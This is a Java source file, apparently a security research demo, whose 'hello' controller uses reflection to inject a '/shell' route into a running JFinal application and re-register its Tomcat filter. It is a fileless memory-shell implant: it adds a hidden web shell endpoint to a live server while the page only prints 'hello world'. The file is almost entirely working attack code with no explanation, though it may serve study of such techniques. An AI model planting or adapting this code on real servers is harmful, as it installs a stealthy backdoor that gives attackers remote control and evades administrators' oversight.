package org.sec.jdemo;

import com.jfinal.config.*;
import com.jfinal.core.*;
import com.jfinal.handler.Handler;
import com.jfinal.handler.HandlerFactory;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.List;

@Path("/hello")
public class HelloController extends Controller {

    public void index() throws Exception {
        Class<?> clazz = Class.forName("com.jfinal.core.Config");
        Field routes = clazz.getDeclaredField("routes");
        routes.setAccessible(true);
        Routes r = (Routes) routes.get(Routes.class);
        r.add("/shell", ShellController.class);
        Class<?> jfClazz = Class.forName("com.jfinal.core.JFinal");
        Field me = jfClazz.getDeclaredField("me");
        me.setAccessible(true);
        JFinal instance = (JFinal) me.get(JFinal.class);
        Field mapping = instance.getClass().getDeclaredField("actionMapping");
        mapping.setAccessible(true);

        ActionMapping actionMapping = new ActionMapping(r);
        Method build = actionMapping.getClass().getDeclaredMethod("buildActionMapping");
        build.setAccessible(true);
        build.invoke(actionMapping);
        mapping.set(instance, actionMapping);

        Method initHandler = jfClazz.getDeclaredMethod("initHandler");
        initHandler.setAccessible(true);
        initHandler.invoke(instance);

        Class<?> filterClazz = Class.forName("com.jfinal.core.JFinalFilter");
        JFinalFilter filter = (JFinalFilter) filterClazz.newInstance();
        Field field = filterClazz.getDeclaredField("jfinal");

        field.setAccessible(true);

        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);

        field.set(filter, instance);

        Field configField = filterClazz.getDeclaredField("jfinalConfig");
        configField.setAccessible(true);
        configField.set(filter,new EmptyConfig());

        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase)
                Thread.currentThread().getContextClassLoader();
        StandardContext standardCtx = (StandardContext) webappClassLoaderBase.getResources().getContext();
        deleteFilter(standardCtx,"jfinal");

        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName("jfinal");
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.addInitParameter("configClass","Test");

        standardCtx.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName("jfinal");
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardCtx.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardCtx, filterDef);
        HashMap<String, Object> filterConfigs = getFilterConfig(standardCtx);
        filterConfigs.put("jfinal", filterConfig);

        renderText("hello world");
    }

    public synchronized void deleteFilter(StandardContext standardContext, String filterName) throws Exception {
        // org.apache.catalina.core.StandardContext#removeFilterDef
        HashMap<String, Object> filterConfig = getFilterConfig(standardContext);
        Object appFilterConfig = filterConfig.get(filterName);
        Field _filterDef = appFilterConfig.getClass().getDeclaredField("filterDef");
        _filterDef.setAccessible(true);
        Object filterDef = _filterDef.get(appFilterConfig);
        Class clsFilterDef = null;
        try {
            clsFilterDef = Class.forName("org.apache.tomcat.util.descriptor.web.FilterDef");
        } catch (Exception e) {
            clsFilterDef = Class.forName("org.apache.catalina.deploy.FilterDef");
        }
        Method removeFilterDef = standardContext.getClass().getDeclaredMethod("removeFilterDef",
                new Class[]{clsFilterDef});
        removeFilterDef.setAccessible(true);
        removeFilterDef.invoke(standardContext, filterDef);

        Class clsFilterMap = null;
        try {
            clsFilterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
        } catch (Exception e) {
            clsFilterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
        }
        Object[] filterMaps = getFilterMaps(standardContext);
        for (Object filterMap : filterMaps) {
            Field _filterName = filterMap.getClass().getDeclaredField("filterName");
            _filterName.setAccessible(true);
            String filterName0 = (String) _filterName.get(filterMap);
            if (filterName0.equals(filterName)) {
                Method removeFilterMap = standardContext.getClass().getDeclaredMethod("removeFilterMap",
                        new Class[]{clsFilterMap});
                removeFilterDef.setAccessible(true);
                removeFilterMap.invoke(standardContext, filterMap);
            }
        }
    }

    public HashMap<String, Object> getFilterConfig(StandardContext standardContext) throws Exception {
        Field _filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
        _filterConfigs.setAccessible(true);
        HashMap<String, Object> filterConfigs = (HashMap<String, Object>) _filterConfigs.get(standardContext);
        return filterConfigs;
    }

    public Object[] getFilterMaps(StandardContext standardContext) throws Exception {
        Field _filterMaps = standardContext.getClass().getDeclaredField("filterMaps");
        _filterMaps.setAccessible(true);
        Object filterMaps = _filterMaps.get(standardContext);
        Object[] filterArray = null;
        try {
            Field _array = filterMaps.getClass().getDeclaredField("array");
            _array.setAccessible(true);
            filterArray = (Object[]) _array.get(filterMaps);
        } catch (Exception e) {
            filterArray = (Object[]) filterMaps;
        }

        return filterArray;
    }

    public String getFilterName(Object filterMap) throws Exception {
        Method getFilterName = filterMap.getClass().getDeclaredMethod("getFilterName");
        getFilterName.setAccessible(true);
        return (String) getFilterName.invoke(filterMap, null);
    }
}